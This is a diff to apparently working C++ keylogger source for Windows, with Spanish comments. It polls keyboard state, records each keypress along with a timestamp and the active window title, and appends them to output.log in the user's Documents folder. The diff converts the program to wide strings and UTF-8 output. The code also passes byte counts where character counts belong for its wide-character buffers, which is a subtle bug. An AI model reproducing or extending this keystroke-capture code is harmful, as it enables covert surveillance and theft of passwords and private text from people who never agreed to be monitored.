@@ -5,100 +5,107 @@
 #include <map>
 #include <string>
 #include <ctime>
+#include <locale>
+#include <codecvt>
 
-// Mapeo base de teclas (layout español/latinoamericano)
-std::map<int, std::string> baseKeys = {
-    { 'A',"a" },{ 'B',"b" },{ 'C',"c" },{ 'D',"d" },{ 'E',"e" },{ 'F',"f" },
-    { 'G',"g" },{ 'H',"h" },{ 'I',"i" },{ 'J',"j" },{ 'K',"k" },{ 'L',"l" },
-    { 'M',"m" },{ 'N',"n" },{ 'O',"o" },{ 'P',"p" },{ 'Q',"q" },{ 'R',"r" },
-    { 'S',"s" },{ 'T',"t" },{ 'U',"u" },{ 'V',"v" },{ 'W',"w" },{ 'X',"x" },
-    { 'Y',"y" },{ 'Z',"z" },{ '0',"0" },{ '1',"1" },{ '2',"2" },{ '3',"3" },
-    { '4',"4" },{ '5',"5" },{ '6',"6" },{ '7',"7" },{ '8',"8" },{ '9',"9" },
-    { VK_SPACE," " },{ VK_OEM_1,"ñ" },{ VK_OEM_COMMA,"," },{ VK_OEM_PERIOD,"." },
-    { VK_OEM_MINUS,"-" },{ VK_OEM_PLUS,"+" },{ VK_OEM_2,"'" },{ VK_OEM_3,"`" },
-    { VK_OEM_4,"{" },{ VK_OEM_5,"\\" },{ VK_OEM_6,"}" },{ VK_OEM_7,"´" }
+// Mapeo base (español/latam)
+std::map<int, std::wstring> baseKeys = {
+    { 'A',L"a" },{ 'B',L"b" },{ 'C',L"c" },{ 'D',L"d" },{ 'E',L"e" },
+    { 'F',L"f" },{ 'G',L"g" },{ 'H',L"h" },{ 'I',L"i" },{ 'J',L"j" },
+    { 'K',L"k" },{ 'L',L"l" },{ 'M',L"m" },{ 'N',L"n" },{ 'O',L"o" },
+    { 'P',L"p" },{ 'Q',L"q" },{ 'R',L"r" },{ 'S',L"s" },{ 'T',L"t" },
+    { 'U',L"u" },{ 'V',L"v" },{ 'W',L"w" },{ 'X',L"x" },{ 'Y',L"y" },{ 'Z',L"z" },
+    { '0',L"0" },{ '1',L"1" },{ '2',L"2" },{ '3',L"3" },{ '4',L"4" },
+    { '5',L"5" },{ '6',L"6" },{ '7',L"7" },{ '8',L"8" },{ '9',L"9" },
+    { VK_SPACE,L" " },{ VK_OEM_1,L"ñ" },{ VK_OEM_COMMA,L"," },{ VK_OEM_PERIOD,L"." },
+    { VK_OEM_MINUS,L"-" },{ VK_OEM_PLUS,L"+" },{ VK_OEM_2,L"'" },{ VK_OEM_3,L"`" },
+    { VK_OEM_4,L"{" },{ VK_OEM_5,L"\\" },{ VK_OEM_6,L"}" },{ VK_OEM_7,L"´" }
 };
 
-// Devuelve hora actual como string hh:mm:ss
-std::string getTimeStamp() {
+std::wstring getTimeStamp() {
     time_t now = time(0);
     struct tm t;
     localtime_s(&t, &now);
-    char buf[10];
-    strftime(buf, sizeof(buf), "%H:%M:%S", &t);
-    return std::string(buf);
+    wchar_t buf[10];
+    wcsftime(buf, sizeof(buf), L"%H:%M:%S", &t);
+    return std::wstring(buf);
 }
 
-// Devuelve el nombre de la ventana activa
-std::string getActiveWindowTitle() {
+std::wstring getActiveWindowTitle() {
     HWND hwnd = GetForegroundWindow();
-    char title[256] = { 0 };
-    GetWindowTextA(hwnd, title, sizeof(title));
-    return std::string(title);
+    wchar_t title[256] = { 0 };
+    GetWindowTextW(hwnd, title, sizeof(title));
+    return std::wstring(title);
 }
 
 int main() {
     char path[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path);
-    std::string logFile = std::string(path) + "\\output.log";
+    std::wstring wpath;
+    int len = MultiByteToWideChar(CP_ACP, 0, path, -1, NULL, 0);
+    if (len > 0) {
+        wchar_t* wbuf = new wchar_t[len];
+        MultiByteToWideChar(CP_ACP, 0, path, -1, wbuf, len);
+        wpath = wbuf;
+        delete[] wbuf;
+    }
+
+    std::wstring logFile = wpath + L"\\output.log";
+
+    std::wofstream file(logFile, std::ios::app);
+    file.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));
 
     std::map<int, bool> pressed;
     bool escOnce = false;
 
-    std::cout << "Iniciado - Presiona ESC dos veces para salir.\n";
+    std::wcout.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>()));
+    std::wcout << L"Iniciado - Presiona ESC dos veces para salir.\n";
 
     while (true) {
         Sleep(20);
-        std::string window = getActiveWindowTitle();
-        std::string time = getTimeStamp();
+        std::wstring window = getActiveWindowTitle();
+        std::wstring time = getTimeStamp();
 
         bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
         bool altgr = GetAsyncKeyState(VK_RMENU) & 0x8000;
         bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
         bool capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
 
-        // Teclas base
         for (const auto& [vk, val] : baseKeys) {
             if (GetAsyncKeyState(vk) & 0x8000) {
                 if (!pressed[vk]) {
-                    std::string output = val;
+                    std::wstring output = val;
 
-                    // SHIFT modificadores comunes
                     if (shift) {
-                        if (output == "1") output = "!";
-                        else if (output == "2") output = "\"";
-                        else if (output == "3") output = "·";
-                        else if (output == "4") output = "$";
-                        else if (output == "5") output = "%";
-                        else if (output == "6") output = "&";
-                        else if (output == "7") output = "/";
-                        else if (output == "8") output = "(";
-                        else if (output == "9") output = ")";
-                        else if (output == "0") output = "=";
-                        else if (output == "+") output = "*";
-                        else if (output == "'") output = "?";
+                        if (output == L"1") output = L"!";
+                        else if (output == L"2") output = L"\"";
+                        else if (output == L"3") output = L"·";
+                        else if (output == L"4") output = L"$";
+                        else if (output == L"5") output = L"%";
+                        else if (output == L"6") output = L"&";
+                        else if (output == L"7") output = L"/";
+                        else if (output == L"8") output = L"(";
+                        else if (output == L"9") output = L")";
+                        else if (output == L"0") output = L"=";
+                        else if (output == L"+") output = L"*";
+                        else if (output == L"'") output = L"?";
                     }
 
-                    // ALTGR
                     if (altgr) {
-                        if (output == "2") output = "@";
-                        else if (output == "3") output = "#";
-                        else if (output == "4") output = "~";
-                        else if (output == "e" || output == "E") output = "€";
+                        if (output == L"2") output = L"@";
+                        else if (output == L"3") output = L"#";
+                        else if (output == L"4") output = L"~";
+                        else if (output == L"e" || output == L"E") output = L"€";
                     }
 
-                    // Mayúsculas si (Shift XOR CapsLock)
-                    if (output.size() == 1 && isalpha(output[0])) {
+                    if (output.size() == 1 && iswalpha(output[0])) {
                         if (shift ^ capsLock) {
-                            output[0] = toupper(output[0]);
+                            output[0] = towupper(output[0]);
                         }
                     }
 
-                    std::ofstream file(logFile, std::ios::app);
-                    file << "[" << time << "] Tecla: " << output << " (Ventana activa: " << window << ")\n";
-                    std::cout << "[" << time << "] Tecla: " << output << " (Ventana activa: " << window << ")\n";
-                    file.close();
-
+                    file << L"[" << time << L"] Tecla: " << output << L" (Ventana activa: " << window << L")\n";
+                    std::wcout << L"[" << time << L"] Tecla: " << output << L" (Ventana activa: " << window << L")\n";
                     pressed[vk] = true;
                 }
             } else {
@@ -106,26 +113,17 @@ int main() {
             }
         }
 
-        // Teclas especiales (SHIFT, CTRL, ALTGR)
-        struct {
-            int vk;
-            std::string name;
-        } specials[] = {
-            { VK_SHIFT, "SHIFT" },
-            { VK_CONTROL, "CTRL" },
-            { VK_RCONTROL, "CTRL" },
-            { VK_MENU, "ALT" },
-            { VK_RMENU, "ALTGR" },
-            { VK_CAPITAL, "CAPS LOCK" }
+        struct { int vk; std::wstring name; } specials[] = {
+            { VK_SHIFT, L"SHIFT" }, { VK_CONTROL, L"CTRL" },
+            { VK_RCONTROL, L"CTRL" }, { VK_MENU, L"ALT" },
+            { VK_RMENU, L"ALTGR" }, { VK_CAPITAL, L"CAPS LOCK" }
         };
 
         for (auto& key : specials) {
             if (GetAsyncKeyState(key.vk) & 0x8000) {
                 if (!pressed[key.vk]) {
-                    std::ofstream file(logFile, std::ios::app);
-                    file << "[" << time << "] Tecla especial: " << key.name
-                         << " (Ventana activa: " << window << ")\n";
-                    file.close();
+                    file << L"[" << time << L"] Tecla especial: " << key.name
+                         << L" (Ventana activa: " << window << L")\n";
                     pressed[key.vk] = true;
                 }
             } else {
@@ -133,14 +131,13 @@ int main() {
             }
         }
 
-        // Salir con doble ESC
         if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
             if (escOnce) {
-                std::cout << "Saliendo...\n";
+                std::wcout << L"Saliendo...\n";
                 break;
             } else {
                 escOnce = true;
-                std::cout << "Presiona ESC otra vez para salir.\n";
+                std::wcout << L"Presiona ESC otra vez para salir.\n";
                 Sleep(300);
             }
         } else {
@@ -148,5 +145,6 @@ int main() {
         }
     }
 
+    file.close();
     return 0;
 }
